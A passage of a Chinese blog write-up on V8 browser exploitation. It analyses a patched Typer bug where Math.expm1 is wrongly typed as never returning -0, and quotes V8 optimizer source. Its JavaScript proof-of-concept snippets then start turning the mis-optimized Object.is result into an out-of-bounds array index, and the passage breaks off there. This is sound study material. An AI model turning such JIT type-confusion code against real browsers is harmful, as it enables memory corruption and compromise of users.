BuiltinFunctionId::kMathExpm1:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathFround:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathLog:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathLog1p:</span><br></pre></td></tr></table></figure></div>
<p>原本 Typer 阶段预测 <code>kMathExpm1</code> 的返回值类型是 <code>Type::Number()</code> ，经过 patch 之后现在变成了 <code>Type::PlainNumber()</code> 或 <code>Type::NaN()</code> 。</p>
<p>在 <code>src/compiler/types.h</code> 中定义了各种数字类型的范围：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  ON    OS32     N31     U30     OU31    OU32     ON</span><br><span class="line">______[_______[_______[_______[_______[_______[_______</span><br><span class="line">    -2^31   -2^30     0      2^30    2^31    2^32</span><br></pre></td></tr></table></figure></div>
<ul>
<li>OtherNumber（ON）：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>−</mo><mi mathvariant="normal">∞</mi><mo separator="true">,</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo stretchy="false">)</mo><mo>∪</mo><mo stretchy="false">[</mo><msup><mn>2</mn><mn>32</mn></msup><mo separator="true">,</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(−\infin,−2^{31})\cup [2^{32},\infin)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">∞</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∞</span><span class="mclose">)</span></span></span></span></li>
<li>OtherSigned32（OS32） ：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><mo>−</mo><msup><mn>2</mn><mn>30</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[−2^{31},−2^{30})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>Negative31（N31）：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>30</mn></msup><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[−2^{30},0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></li>
<li>Unsigned30（U30）: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><msup><mn>2</mn><mn>30</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[0,2^{30})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>OtherUnsigned31（OU31）: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msup><mn>2</mn><mn>30</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[2^{30},2^{31})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>OtherUnsigned32（OU32）: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>32</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[2^{31},2^{32})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>Integral32：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>32</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[−2^{31},2^{32})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>PlainNumber：任何浮点数，不包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">−0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">0</span></span></span></span></li>
<li>Number：任何浮点数，包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">−0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">0</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>NaN</mtext></mrow><annotation encoding="application/x-tex">\text{NaN}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">NaN</span></span></span></span></span></li>
<li>Numeric：任何浮点数，包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">−0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">0</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>NaN</mtext></mrow><annotation encoding="application/x-tex">\text{NaN}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">NaN</span></span></span></span></span> 以及 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>BigInt</mtext></mrow><annotation encoding="application/x-tex">\text{BigInt}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord">BigInt</span></span></span></span></span></li>
</ul>
<p>根据前面的分析，下面这段 js 代码中 <code>console.log(foo(-0))</code> 应该输出 <code>false</code> 。然而实际运行的结果却是 <code>true</code> 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), -<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
<p>分析优化过程发现 <code>Math.expm1</code> 被初始成 <code>NumberExpm1</code> 并且在 simplified lowering 被替换为 <code>Float64Expm1</code> 。这个函数的返回值为 <code>Number</code> 类型，因此可以返回 -0 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/9c774edef143b023790941a7a0d5403b.png"
                      alt="在这里插入图片描述"
                ><br>为了避免出现上述情况，我们在向 <code>foo</code> 函数传入字符串类型参数，此时输出结果变为 <code>false</code> 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), -<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
<p>可以看到 typer 优化阶段后 <code>Math.expm1</code> 返回值类型被判断为 <code>PlainNumber</code> 或 <code>NaN</code> ，与前面的 patch 内容相符。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/4555ae74d8eb9ad733dcf5009665d5ed.png"
                      alt="在这里插入图片描述"
                ><br>这里可以看到 <code>Object.is</code> 被优化为 <code>SameValue</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES section #sec-object.is</span></span><br><span class="line"><span class="function">Reduction <span class="title">JSCallReducer::ReduceObjectIs</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(IrOpcode::kJSCall, node-&gt;<span class="built_in">opcode</span>());</span><br><span class="line">  CallParameters <span class="type">const</span>&amp; params = <span class="built_in">CallParametersOf</span>(node-&gt;<span class="built_in">op</span>());</span><br><span class="line">  <span class="type">int</span> <span class="type">const</span> argc = <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(params.<span class="built_in">arity</span>() - <span class="number">2</span>);</span><br><span class="line">  Node* lhs = (argc &gt;= <span class="number">1</span>) ? NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">2</span>)</span><br><span class="line">                          : <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">UndefinedConstant</span>();</span><br><span class="line">  Node* rhs = (argc &gt;= <span class="number">2</span>) ? NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">3</span>)</span><br><span class="line">                          : <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">UndefinedConstant</span>();</span><br><span class="line">  Node* value = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">SameValue</span>(), lhs, rhs);</span><br><span class="line">  <span class="built_in">ReplaceWithValue</span>(node, value);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Replace</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>搜索 <code>JSCallReducer</code> 发现这个优化位于 <code>InliningPhase</code> 阶段。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">InliningPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">JSCallReducer <span class="title">call_reducer</span><span class="params">(&amp;graph_reducer, data-&gt;jsgraph(), data-&gt;broker(),</span></span></span><br><span class="line"><span class="params"><span class="function">                               data-&gt;info()-&gt;is_bailout_on_uninitialized()</span></span></span><br><span class="line"><span class="params"><span class="function">                                   ? JSCallReducer::kBailoutOnUninitialized</span></span></span><br><span class="line"><span class="params"><span class="function">                                   : JSCallReducer::kNoFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">                               data-&gt;dependencies())</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外搜索 <code>SameValue</code> 发现存在如下优化：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">TypedOptimization::ReduceSameValue</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(IrOpcode::kSameValue, node-&gt;<span class="built_in">opcode</span>());</span><br><span class="line">  Node* <span class="type">const</span> lhs = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">0</span>);</span><br><span class="line">  Node* <span class="type">const</span> rhs = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">1</span>);</span><br><span class="line">  Type <span class="type">const</span> lhs_type = NodeProperties::<span class="built_in">GetType</span>(lhs);</span><br><span class="line">  Type <span class="type">const</span> rhs_type = NodeProperties::<span class="built_in">GetType</span>(rhs);</span><br><span class="line">  <span class="keyword">if</span> (lhs == rhs) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,x) =&gt; #true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Replace</span>(<span class="built_in">jsgraph</span>()-&gt;<span class="built_in">TrueConstant</span>());</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">Unique</span>()) &amp;&amp; rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">Unique</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:unique,y:unique) =&gt; ReferenceEqual(x,y)</span></span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ReferenceEqual</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">String</span>()) &amp;&amp; rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">String</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:string,y:string) =&gt; StringEqual(x,y)</span></span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">StringEqual</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">MinusZero</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:minus-zero,y) =&gt; ObjectIsMinusZero(y)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">0</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsMinusZero</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">MinusZero</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,y:minus-zero) =&gt; ObjectIsMinusZero(x)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">1</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsMinusZero</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">NaN</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:nan,y) =&gt; ObjectIsNaN(y)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">0</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsNaN</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">NaN</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,y:nan) =&gt; ObjectIsNaN(x)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">1</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsNaN</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">PlainNumber</span>()) &amp;&amp;</span><br><span class="line">             rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">PlainNumber</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:plain-number,y:plain-number) =&gt; NumberEqual(x,y)</span></span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">NumberEqual</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>搜索 <code>TypedOptimization</code> 发现在 typed lowering 和 load elimination 阶段调用了该优化。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypedLoweringPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;typed lowering&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">TypedOptimization <span class="title">typed_optimization</span><span class="params">(&amp;graph_reducer, data-&gt;dependencies(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                         data-&gt;jsgraph(), data-&gt;broker())</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LoadEliminationPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;load elimination&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">TypedOptimization <span class="title">typed_optimization</span><span class="params">(&amp;graph_reducer, data-&gt;dependencies(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                         data-&gt;jsgraph(), data-&gt;broker())</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>foo</code> 函数的第一次优化的 typed lowering 阶段 <code>SameValue</code> 被替换为 <code>ObjectIsMinusZero</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/0a24359e5f939d4c8551a234cc07e2db.png"
                      alt="在这里插入图片描述"
                ><br>而在第二次优化时由于 <code>Math.expm1</code> 返回值一定不是 -0 因此 typed lowering 阶段 <code>SameValue</code> 被替换为 <code>false</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/d1c0055602cf681c9bd6b3422f61bf99.png"
                      alt="在这里插入图片描述"
                ><br>接下来我们尝试用 <code>Object.is</code> 的返回值来访问 <code>JSArray</code> 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> oob_array = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>]</span><br><span class="line">    <span class="keyword">let</span> index = <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), -<span class="number">0</span>);</span><br><span class="line">    index *= <span 